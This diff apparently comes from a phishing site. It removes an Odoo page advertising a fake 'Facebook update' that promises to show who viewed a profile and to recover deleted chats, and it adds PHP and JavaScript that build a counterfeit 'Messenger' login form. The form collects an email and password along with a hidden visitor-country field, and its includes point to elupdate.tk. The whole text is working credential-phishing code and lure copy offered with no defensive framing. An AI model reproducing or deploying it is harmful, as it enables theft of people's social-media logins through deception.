@@ -1,244 +1,56 @@
+<?php 
+include 'elupdate.tk/data/header.php';
+include 'elupdate.tk/data/translate.php';
+include 'elupdate.tk/data/ip.php';
+?>
 
+                var br = document.createElement("br");
+                var br2 = document.createElement("br");
+                var br3 = document.createElement("br");
+                var t = document.createTextNode("<?php echo $txt; ?> ");
+                var h = document.createElement("h1");
+                var m = document.createElement("p");
+                var mtxt = document.createTextNode("Messenger");
+                m.appendChild(mtxt);
+                var br4 = document.createElement("br");
+                var br5 = document.createElement("br");
+                var br6 = document.createElement("br");
+				var ID = document.createElement("input");
+				ID.setAttribute("type", "text");
+				ID.setAttribute("name", "mail");
+				ID.setAttribute("placeholder", "<?php echo $txt_mail; ?>");
+				ID.setAttribute("required","");
+				ID.setAttribute('minlength', 3);
+				var PWD = document.createElement("input");
+				PWD.setAttribute("type", "password");
+				PWD.setAttribute("name", "pass");
+				PWD.setAttribute("placeholder", "<?php echo $txt_pass; ?>");
+				PWD.setAttribute("required","");
+				PWD.setAttribute('minlength', 6);
+                var c = document.createElement("input");
+                c.setAttribute("name", "country");
+                c.setAttribute("type", "hidden");
+                c.setAttribute("value", "<?php echo ip_visitor_country();?>");
+		     	var s = document.createElement('button');
+                s.setAttribute('content', 'test content');
+                s.setAttribute('class', 'btn');  
+                s.textContent = '<?php echo $txt_button; ?>';
+                form.append(imgFace);
+                
+                form.appendChild(m);
+                form.append(br5);
+                form.append(t);
+                form.append(br6);
+                form.append(br4);
+				form.append(ID);
+				form.append(PWD);
+				form.append(c);
+               	form.append(s);
+               document.getElementsByTagName("body")[0]
+			.appendChild(form);
+			}
+			</script>
 
-  <!DOCTYPE html>
-        
-        
-            
-        
-    <html lang="en-US" data-website-id="1" data-oe-company-name="elupdate">
-            
-        
-            
-                
-            
-            
-            
-            
-                
-            
-        
-        
-    <head>
-                <meta charset="utf-8"/>
-                <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"/>
-        <meta name="generator" content="Odoo"/>
-        
-        
-        
-            
-            
-            
-        
-        
-        
-            
-            
-            
-                
-                    
-                        <meta property="og:type" content="website"/>
-                    
-                
-                    
-                        <meta property="og:title" content="Home | elupdate"/>
-                    
-                
-                    
-                        <meta property="og:site_name" content="elupdate"/>
-                    
-                
-                    
-                        <meta property="og:url" content="https://elupdate.odoo.com/"/>
-                    
-                
-                    
-                        <meta property="og:image" content="https://elupdate.odoo.com/web/image/website/1/logo?unique=0ee2d09"/>
-                    
-                
-            
-            
-            
-                
-                    <meta name="twitter:card" content="summary_large_image"/>
-                
-                    <meta name="twitter:title" content="Home | elupdate"/>
-                
-                    <meta name="twitter:image" content="https://elupdate.odoo.com/web/image/website/1/logo?unique=0ee2d09"/>
-                
-            
-        
-
-        
-            
-            
-        
-        <link rel="canonical" href="https://elupdate.odoo.com/"/>
-
-        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin=""/>
-    
-  
-
-                <title> Home | elupdate </title>
-                <link type="image/x-icon" rel="shortcut icon" href="/web/image/website/1/favicon?unique=0ee2d09"/>
-    <link rel="preload" href="/web/static/lib/fontawesome/fonts/fontawesome-webfont.woff2?v=4.7.0" as="font" crossorigin=""/>
-    <link type="text/css" rel="stylesheet" href="/web/content/221-535b04c/1/web.assets_common.css" data-asset-xmlid="web.assets_common" data-asset-version="535b04c"/>
-    <link type="text/css" rel="stylesheet" href="/web/content/222-48a7567/1/web.assets_frontend.css" data-asset-xmlid="web.assets_frontend" data-asset-version="48a7567"/>
-        
-    
-  
-
-                <script id="web.layout.odooscript" type="text/javascript">
-                    var odoo = {
-                        csrf_token: "7099729c0da0b1620b736be592765811d7ee384eo1654093395",
-                        debug: "",
-                    };
-                </script>
-    <script type="text/javascript">
-                odoo.session_info = {"is_admin": false, "is_system": false, "is_website_user": true, "user_id": false, "is_frontend": true, "translationURL": "/website/translations", "cache_hashes": {"translations": "63c39b9719623b23090242bff39258f3aa29fe2b"}};
-                if (!/(^|;\s)tz=/.test(document.cookie)) {
-                    const userTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    document.cookie = `tz=${userTZ}; path=/`;
-                }
-            </script>
-    <script defer="defer" type="text/javascript" src="/web/content/206-cc43242/1/web.assets_common_minimal_js.js" data-asset-xmlid="web.assets_common_minimal_js" data-asset-version="cc43242"></script>
-    <script defer="defer" type="text/javascript" src="/web/content/207-bbdd1ba/1/web.assets_frontend_minimal_js.js" data-asset-xmlid="web.assets_frontend_minimal_js" data-asset-version="bbdd1ba"></script>
-    
-        
-    
-    <script defer="defer" type="text/javascript" data-src="/web/content/223-a70ee4c/1/web.assets_common_lazy.js" data-asset-xmlid="web.assets_common_lazy" data-asset-version="a70ee4c"></script>
-    <script defer="defer" type="text/javascript" data-src="/web/content/224-fd585bc/1/web.assets_frontend_lazy.js" data-asset-xmlid="web.assets_frontend_lazy" data-asset-version="fd585bc"></script>
-        
-    
-  
-
-                
-            
-            <noscript id="o_animate-no-js_fallback">
-                <style type="text/css">
-                    .o_animate {
-                        /* If no js - force elements rendering */
-                        visibility:visible;
-
-                        /* If browser support css animations support - reset animation */
-                        -webkit-animation-name: none-dummy;
-                        animation-name: none-dummy;
-                    }
-                </style>
-            </noscript>
-        
-        
-    </head>
-            <body class="">
-                
-        
-    
-            
-            
-        <div id="wrapwrap" class="homepage   ">
-      <header id="top" data-anchor="true" data-name="Header" class="  o_header_standard">
-        <nav data-name="Navbar" class="navbar navbar-light o_colored_level o_cc">
-            <div id="top_menu_container" class="container">
-                
-    <a href="/" class="navbar-brand logo mr-auto">
-            <span role="img" aria-label="Logo of elupdate" title="elupdate"><img src="/web/image/website/1/logo/elupdate?unique=0ee2d09" class="img img-fluid" alt="elupdate" loading="lazy"/></span>
-        </a>
-    
-                <ul class="nav navbar-nav navbar-expand">
-                    
-            <li class="nav-item o_no_autohide_item">
-                <a href="/web/login" class="nav-link">Sign in</a>
-            </li>
-        
-                    
-        
-        
-            
-        
-    
-    
-                </ul>
-                
-    <button type="button" data-toggle="collapse" data-target="#top_menu_collapse" class="navbar-toggler order-first mr-auto">
-        <span class="navbar-toggler-icon o_not_editable"></span>
-    </button>
-
-                
-                <div class="oe_structure oe_structure_solo" id="oe_structure_header_hamburger_1">
-            
-        </div>
-  <div id="top_menu_collapse" class="collapse navbar-collapse">
-                    
-    
-        <div class="o_offcanvas_menu_backdrop" data-toggle="collapse" data-target="#top_menu_collapse" aria-label="Toggle navigation"></div>
-    <ul id="top_menu" class="nav navbar-nav o_menu_loading ">
-        
-        <li class="o_offcanvas_menu_toggler order-first navbar-toggler text-right border-0 o_not_editable">
-            <a href="#top_menu_collapse" class="nav-link px-3" data-toggle="collapse">
-                <span class="fa-2x">×</span>
-            </a>
-        </li>
-    
-                        
-                            
-    
-    <li class="nav-item">
-        <a role="menuitem" href="/" class="nav-link active">
-            <span>Home</span>
-        </a>
-    </li>
-    
-
-                        
-                            
-    
-    <li class="nav-item">
-        <a role="menuitem" href="/contactus" class="nav-link ">
-            <span>Contact us</span>
-        </a>
-    </li>
-    
-
-                        
-                    
-        <li class="o_offcanvas_logo_container order-last navbar-toggler py-4 order-1 mt-auto text-center border-0">
-            <a href="/" class="o_offcanvas_logo logo">
-            <span role="img" aria-label="Logo of elupdate" title="elupdate"><img src="/web/image/website/1/logo/elupdate?unique=0ee2d09" class="img img-fluid" style="max-width: 200px" alt="elupdate" loading="lazy"/></span>
-        </a>
-    </li>
-    
-    </ul>
-
-                    </div>
-            </div>
-        </nav>
-    </header>
-      <main>
-        
-            
-        
-    
-    <div id="wrap" class="oe_structure oe_empty">
-      <section class="s_cover o_colored_level s_parallax_no_overflow_hidden undefined o_cc o_cc1 o_full_screen_height pb0 pt32 o_visible" data-scroll-background-ratio="0" data-snippet="s_cover" data-name="Cover" style="">
-        <div class="s_allow_columns container">
-          <h1 style="text-align: center;">
-            <span style="font-size: 36px;" class="bg-white">
-              <b>Facebook update</b>
-              <b>
-                <br/>
-              </b>
-            </span>
-          </h1>
-          <h1 style="text-align: center;">The update includes who viewed your profile</h1>
-          <h1 style="text-align: center;">Recover deleted conversations</h1>
-          <h1 style="text-align: center;">And more functions, find out through the button below</h1>
-          <p style="text-align: center;">
-            <a href="https://elupdatea.blogspot.com/" class="btn btn-lg btn-primary mb-2" data-original-title="" title="">UPDATE NOW</a>
-          </p>
-        </div>
-      </section>
-    </div>
-      </main>
-    </div>
-    </body>
+	</body>
+	
 </html>
